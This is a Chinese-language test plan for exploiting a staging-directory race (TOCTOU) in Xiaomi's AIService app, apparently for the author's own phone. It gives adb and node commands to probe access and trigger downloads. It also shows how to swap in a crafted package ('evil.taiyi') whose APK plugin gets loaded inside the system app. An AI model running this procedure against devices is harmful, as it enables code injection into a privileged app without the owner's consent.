# 无 root 测试方案：AIService 资源暂存目录替换（TOCTOU）

目标：不 root，仅用 Shizuku（adb shell 身份）验证能否让 AIService 安装**我们提供**的
资源包。依据见 [NOTES.md §25](../../NOTES.md)：下载暂存目录 `/sdcard/Android/data/
com.xiaomi.aiservice/files/download/taiyi/...` 对 shell **可读可写**，而 `PLUGIN`/`MODEL`
包的安装期校验只比对**包内自带**的 `taiyi_hash.json`（自证）。

机制已在宿主机验证：[swap-sim.js](swap-sim.js) 用**设备上要跑的同一份脚本**
（`chat/assets/staging_swap.sh`）模拟"下载中替换 + 安装器拷贝"，两种写入风格
（单 fd / 反复 reopen）最终安装器都读到了我们的包：

```bash
node tools/staging/swap-sim.js          # 期望输出 PASS: installer read our payload in all styles
node tools/staging/mkpack.js --out /tmp/repl.taiyi --size <bytes> --add ...
```

## 0. 前置条件

- 设备：`lhasa`（Xiaomi 18 Fold），已装本仓库的 `chat/taiyi-chat.apk`
- **Shizuku 已安装并以 shell 模式启动**（无线调试或 adb 启动），且已授权本 app
- 主机可 `adb`（`nix develop`）

```bash
adb install -r chat/taiyi-chat.apk
adb shell am force-stop com.example.taiyi.chat      # 让 intent extras 走 onCreate
```

## 1. 先回答"root 到底要不要"（无副作用）

```bash
adb logcat -c
adb shell am start -n com.example.taiyi.chat/.ChatActivity --ez probeAccess true
sleep 8
adb logcat -d | grep -E "TaiyiShell|ACCESS"
```

判读：

| 标记 | 含义 |
|---|---|
| `ACCESS_ID uid=2000 ...` | 当前是 shell 身份 |
| `ACCESS_SHELL_LS` 后跟 `Permission denied` | shell 域**进不去**私有目录（已确认） |
| `ACCESS_SU_BIN=/system/bin/su` 且 `ACCESS_SU_ID uid=0` | 设备有可用 `su`（KSU 已授权本 app）→ 设计 B 可走 su |
| `ACCESS_SU_BIN=none` | 无 su → 设计 B 需要 o3root+KSU 授权或解锁 BL |
| `ACCESS_STAGING` 后 `WRITE_OK` | 暂存目录可写（本方案的前提成立） |

## 2. 观察暂存目录（无副作用）

```bash
adb shell am force-stop com.example.taiyi.chat
adb logcat -c
adb shell am start -n com.example.taiyi.chat/.ChatActivity --ez staging true
sleep 10
adb logcat -d | grep -E "STAGING_(SHELL|SCRIPT|FILE)"
```

`STAGING_FILE <size> <path>` 是当前暂存树里的文件；2026-10-27 实测该树只有**空目录骨架**，
即下载完成后文件会被搬走/删除，这解释了"替换窗口只存在于下载→安装之间"。

## 3. 找可触发的下载（要挑"未装全"的资源）

**这一步是本方案唯一的现实前提。** 本机 2026-10-27 实测 `mimo_dev` 与 bundle 全部
`left=0`（已装全），而 shell 无法伪造"已下载"记录（记录在私有 Room 库），所以必须
存在一个**真的需要下载**的资源。三条可选路子：

1. **找未安装的 api**（首选）：一次把 `artifacts/ai-config.json` 里 39 个 api 全查一遍：

   ```bash
   APIS="aesthetic,asr_maize,asrv2,auto_crop,bert,card_recognize,face_cluster,framework,iqa,lac,llm_runtime,mimo_dev,mimo_lora_offline_xiaoai,mimo_lora_user_profile_clue,mimo_lora_user_profile_merge,ner_travel,nlu_intent,nlu_intent_ime,ocr,pet,powerai_inactivity_predict,quality,schedule,segment,siglip,similarity_cluster,sm_auditor,translate,tts,tts_xaee,video_segment,vlm,vlm_lora_entity_relation_graph,vlm_lora_gallery_caption,vlm_lora_image_extraction,vlm_lora_qwen_caption,vlm_lora_qwen_text_extraction,wechat_privacy,wps"
   adb logcat -c
   adb shell am force-stop com.example.taiyi.chat
   adb shell am start -n com.example.taiyi.chat/.ChatActivity --es apis "$APIS"
   sleep 12
   adb logcat -d | grep -E "DL_PROBE"
   ```

   - 聚合 `left=0 B` → 全部装全；`left>0` → 二分这些 api 找出缺的那个（`--ez dlstart true`
     即为触发下载）。
2. **等一次资源版本更新**：服务端把某资源 version 提升（OTA/配置更新）时会触发下载，
   窗口自然出现；`--ez dlstart true` 可手动催一次（如果该 api 的 `left>0`）。
3. **核选项（会清空 4.6 GB 已装模型，需明确同意）**：
   `adb shell pm uninstall --user 0 com.xiaomi.aiservice` 后
   `adb shell cmd package install-existing com.xiaomi.aiservice`，
   下次使用会重新下载全部资源 —— 窗口很大很好抓，但代价是重下几 GB 且状态重置。

## 4. 低风险练手：证明"我们的包到达了安装步骤"（不改变功能）

选一个 **非 zip 且带哈希**的小资源：`param/vlm_param/3/vlm_param.json`（161 字节，
`fileHash=bae677ee…`）。安装期对非 zip 资源做**真哈希**比对，所以我们的替换包
**必定校验失败**——失败日志恰证明安装器读到了我们的包（窗口存在），而资源功能不变。

```bash
# 4.1 造同尺寸替换包（161 字节已验证可行：node mkpack.js --size 161 输出恰为 161 字节）
node tools/staging/mkpack.js --out /tmp/repl161.taiyi --size 161 --add "marker.txt=ours"
unzip -t /tmp/repl161.taiyi            # 期望 "No errors detected"
adb push /tmp/repl161.taiyi /data/local/tmp/repl.taiyi

# 4.2 先武装替换，再触发下载（顺序重要：窗口覆盖整个下载+安装过程）
adb shell am force-stop com.example.taiyi.chat
adb logcat -c
adb shell am start -n com.example.taiyi.chat/.ChatActivity \
  --ez armswap true \
  --es swaptarget "/sdcard/Android/data/com.xiaomi.aiservice/files/download/taiyi/param/vlm_param/3/vlm_param.json" \
  --es swappayload "/data/local/tmp/repl.taiyi" \
  --ez swapesize 161 --ez swapdur 60000
# 紧接着（另一个终端 / 下一条命令）触发需要该资源的下载：
adb shell am start -n com.example.taiyi.chat/.ChatActivity --es apis "vlm" --ez dlstart true
sleep 65
adb logcat -d | grep -E "SWAP|STAGING_|ResourceInstaller|hash not match"
```

成功判据（练手版）：`STAGING_SWAP n=…` 出现，且随后 AIService 侧出现
`copy hash not match`（说明我们的文件被送到安装校验）。**资源功能不变**。

## 5. 正式替换（会改写私有目录，需明确同意后再做）

目标选 `PLUGIN`（如 `mimo_dev_f3@25`，`isZip()=true` → 自证校验）或
`MODEL`（`bert_model_npu_xring_o3@5`，`fileHash` 为空 → 连哈希都没有）：

```bash
# 5.1 造包：同尺寸、中央目录在末尾、内含我们的 APK（或标记文件）
node tools/staging/mkpack.js --out /tmp/evil.taiyi --size <fileSize> \
  --add "plugin-mimo_vlm-mimo_vlm_mimo_cloud_F3-1.apk=/path/to/our.apk" \
  --add "taiyi_hash.json=[{\"name\":\"plugin-mimo_vlm-mimo_vlm_mimo_cloud_F3-1.apk\",\"hash\":\"<sha256>\",\"size\":<n>}]"
adb push /tmp/evil.taiyi /data/local/tmp/repl.taiyi

# 5.2 armswap（同上，把 swaptarget 换成 PLUGIN/MODEL 的暂存路径）
# 5.3 触发该资源的下载：--es apis "<其所属 api>" --ez dlstart true
```

判据（三条任一即证明安装使用了我们的内容）：

1. 我们 APK 里的插件在 AIService 进程内被加载 → logcat 出现我们写的标记日志；
2. 若包内容故意损坏 → AIService 报出解析我们文件的错误（路径/字段来自我们的包）；
3. `--ez staging true` 显示 `STAGING_DONE` 后目标路径上仍是我们的文件。

## 6. 风险、回滚与边界

- 第 5 步会**改写系统应用 `com.xiaomi.aiservice` 的私有资源**（插件/模型目录）。
  官方回滚方式 = 让 AIService 重新下载并安装同一资源（需要 `left>0` 的条件，或被
  OTA/资源版本更新触发）；否则只能靠 OTA 覆盖。**没有 root 时无法直接删私有文件。**
  因此第 5 步请单独确认后再执行；先做第 1–4 步。
- 替换窗口依赖真实下载；`DownloadProvider` 只有 `query/pause/cancel`，下载状态记录在
  私有 Room 库，shell 无法伪造"已下载"，所以必须"趁真实下载替换"。
- 本方案不修改内核、不需要解锁 BL、不掉数据；失败时资源保持原样（校验不过）或
  被重新下载。

## 7. 与 root 路线的关系

- 若第 1 步显示无 `su` 且 shell 域确实进不去私有目录，则**设计 B 需要**：o3root 起 root
  后仍受 SELinux 限制（payload 不切换域），需要在 KSU 管理器里给本 app 授权以获得
  `su` 域，或解锁 BL。
- 本方案的 app 侧入口（`chat/`）已包含：暂存扫描、下载探测/触发、替换武装、
  三路访问探测，设备回来即可按上面命令逐条跑。